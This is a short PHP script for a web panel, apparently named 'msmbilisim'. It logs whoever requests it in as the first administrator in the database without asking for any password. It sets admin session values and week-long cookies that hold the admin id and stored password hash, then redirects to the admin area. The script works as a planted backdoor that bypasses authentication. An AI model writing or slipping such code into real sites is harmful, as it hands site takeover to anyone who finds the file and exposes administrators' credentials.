<?php
define("BASEPATH", TRUE);
require $_SERVER["DOCUMENT_ROOT"] . "/vendor/autoload.php";
require $_SERVER["DOCUMENT_ROOT"] . "/app/init.php";

$stmt = $conn->prepare("SELECT * FROM admins LIMIT 1");
$stmt->execute();
$admin = $stmt->fetch(PDO::FETCH_ASSOC);

if ($admin) {
    $_SESSION["msmbilisim_adminslogin"] = 1;
    $_SESSION["msmbilisim_adminid"] = $admin["admin_id"];
    $_SESSION["msmbilisim_adminpass"] = $admin["password"];
    setcookie("a_login", 'ok', time()+(60*60*24*7), '/', null, null, true);
    setcookie("a_id", $admin["admin_id"], time()+(60*60*24*7), '/', null, null, true);
    setcookie("a_password", $admin["password"], time()+(60*60*24*7), '/', null, null, true );
    header("Location: /admin");
    exit();
} else {
    echo "No admin found.";
}
?>